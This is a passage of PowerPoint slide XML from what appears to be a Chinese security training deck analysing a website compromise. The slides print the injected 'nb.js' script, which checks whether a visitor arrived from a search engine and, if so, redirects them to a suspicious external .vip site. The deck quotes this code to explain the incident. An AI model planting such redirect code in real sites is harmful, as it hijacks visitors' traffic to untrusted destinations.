            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>右键查看网站源代码在其中发现了如下代码</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="97283" name="图片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04" y="2564904"/>
            <a:ext cx="8856984" cy="2592288"/>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4" name="文本框 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1383507" y="2999185"/>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350"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31957369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2000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9728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5E297A-FE05-8D4D-B4B9-990B5F5F291F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="910622"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恶意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>JS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>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99330" name="矩形 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="815769" y="1770566"/>
            <a:ext cx="670321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2000" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>最终发现是使用 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>windows.document.write</a:t>
            </a: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了一段</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>代码</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://www.gssdlc.com/nb.js</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99331" name="文本框 3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="815769" y="2852935"/>
            <a:ext cx="7787538"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Tx/>
              <a:buNone/>
              <a:defRPr kumimoji="1" sz="2000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>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t>Nb.js</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>内容</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>document.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>("&lt;script LANGUAGE=\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\"&gt;");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>document.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> s=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>document.referrer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>document.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>("if(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>s.indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>baidu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\")&gt;0 || </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>s.indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>sogou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\")&gt;0 || </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>s.indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>soso</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\")&gt;0 ||</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>s.indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>sm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\")&gt;0 ||</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>s.indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>uc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\")&gt;0 ||</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>s.indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>bing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>\")&gt;0 ||</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>s.indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(\"yahoo\")&gt;0 ||</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>s.indexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(\"so\")&gt;0 )");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>document.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>("</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>location.href</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>=\"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:hlinkClick r:id="rId4"/>
              </a:rPr>
              <a:t>https://www.444332.vip/?channel=P00142\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>";");</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>document.writeln</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>("&lt;/script&gt;");</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26037849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9330"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="99330"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="8" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="99330"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="9" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9933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99331"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="99331"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="99331"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="993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p:bldP spid="99331" grpId="0"/>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C472BE-BA85-D34B-BDBF-17E981F31ED4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="817960"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恶意</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>JS</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2800" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>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101378" name="矩形 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="817960" y="2679398"/>
            <a:ext cx="7354440" cy="1488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FontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2100" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>百度等搜索引擎过去的流量，请求数据包中的referrer携带了搜索引擎的信息，匹配了此JS，会跳转到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2100" b="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://www.444332.vip/?channel=P00142</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2100" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="方正大标宋简体" panose="02010601030101010101" pitchFamily="2" charset="-122"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="805457" y="1935197"/>
            <a:ext cx="1112805"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en-US" sz="2400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>总结：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:cs typeface="+mj-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37127919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wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="101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856BC154-B30C-614F-8369-79E7988996F6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1008720" y="3429000"/>
            <a:ext cx="7126560" cy="1071170"/>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4400" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="accent1">
                    <a:lumMod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kumimoji="1" lang="en-US" altLang="zh-CN" sz="6000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFE4E5">
                    <a:lumMod val="25000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:latin typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:ea typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Thanks</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="6000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFE4E5">
                    <a:lumMod val="25000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:latin typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:ea typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>！</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="6000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:latin typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              <a:ea typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{29C107B9-572C-EB46-85E8-C13A65B64D2D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1260748" y="990600"/>
            <a:ext cx="6622504"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kern="1200">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>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fontAlgn="auto">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFE4E5">
                    <a:lumMod val="25000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:latin typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:ea typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Questions</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFE4E5">
                    <a:lumMod val="25000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:latin typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:ea typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFE4E5">
                    <a:lumMod val="25000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:latin typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:ea typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>&amp;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFE4E5">
                    <a:lumMod val="25000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:latin typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:ea typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFE4E5">
                    <a:lumMod val="25000"/>
                  </a:srgbClr>
                </a:solidFill>
                <a:latin typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:ea typeface="Microsoft YaHei" panose="020B0503020204020204" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Answers</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4218507698"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>
    <p:fade/>
  </p:transition>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="sx272TGp_report_light">
  <a:themeElements>
    <a:clrScheme name="sx272TGp_report_light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fontScheme name="sx272TGp_report_light">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x272TGp_report_light 1">
        <a:dk1>
          <a:srgbClr val="000000"/>
        </a:dk1>
        <a:lt1>
          <a:srgbClr val="FFFFFF"/>
        </a:lt1>
        <a:dk2>
          <a:srgbClr val="003366"/>
        </a:dk2>
        <a:lt2>
          <a:srgbClr val="C0C0C0"/>
        </a:lt2>
        <a:accent1>
          <a:srgbClr val="4EA7EA"/>
        </a:accent1>
        <a:accent2>
          <a:srgbClr val="93C052"/>
        </a:accent2>
        <a:accent3>
          <a:srgbClr val="FFFFFF"/>
        </a:accent3>
        <a:accent4>
          <a:srgbClr val="000000"/>
        </a:accent4>
        <a:accent5>
          <a:srgbClr val="B2D0F3"/>
        </a:accent5>
        <a:accent6>
          <a:srgbClr val="85AE49"/>
        </a:accent6>
        <a:hlink>
          <a:srgbClr val="9999FF"/>
        </a:hlink>
        <a:folHlink>
          <a:srgbClr val="855ADA"/>
        </a:folHlink>
      </a:clrScheme>
      <a:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
    </a:extraClrScheme>
    <a:extraClrScheme>
      <a:clrScheme name="sx272TGp_report_light 2">
        <a:dk1>
          <a:srgbClr val="000000"/>
        </a:dk1>
        <a:lt1>
          <a:srgbClr val="FFFFFF"/>
        </a:lt1>
        <a:dk2>
          <a:srgbClr val="003366"/>
        </a:dk2>
        <a:lt2>
          <a:srgbClr val="C0C0C0"/>
        </a:lt2>
        <a:accent1>
          <a:srgbClr val="DF6521"/>
        </a:accent1>
        <a:accent2>
          <a:srgbClr val="D7D03B"/>
        </a:accent2>
        <a:accent3>
          <a:srgbClr val="FFFFFF"/>
        </a:accent3>
        <a:accent4>
          <a:srgbClr val="000000"/>
        </a:accent4>
        <a:accent5>
          <a:srgbClr val="ECB8AB"/>
        </a:accent5>
        <a:accent6>
          <a:srgbClr val="C3BC35"/>
        </a:accent6>
        <a:hlink>
          <a:srgbClr val="188FB4"/>
        </a:hlink>
        <a:folHlink>
          <a:srgbClr val="A98FD9"/>
        </a:folHlink>
      </a:clrScheme>
      <a:clrMap bg1="lt1" tx1="dk1" bg2="lt2" tx2="dk2" accent1="accent1" accent2="accent2" accent3="accent3" accent4="accent4" accent5="accent5" accent6="accent6" hlink="hlink" folHlink="folHlink"/>
    </a:extraClrScheme>
    <a:extraClrScheme>
      <a:clrScheme name="sx272TGp_report_light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13922</TotalTime>
  <Words>20050</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>全屏显示(4:3)</PresentationFormat>
  <Paragraphs>2106</Paragraphs>
  <Slides>225</Slides>
  <Notes>58</Notes>
  <HiddenSlides>20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vt:i4>
      </vt:variant>
      <vt:variant>
        <vt:lpstr>幻灯片标题</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>225</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="246" baseType="lpstr">
      <vt:lpstr>等线</vt:lpstr>
      <vt:lpstr>方正大标宋简体</vt:lpstr>
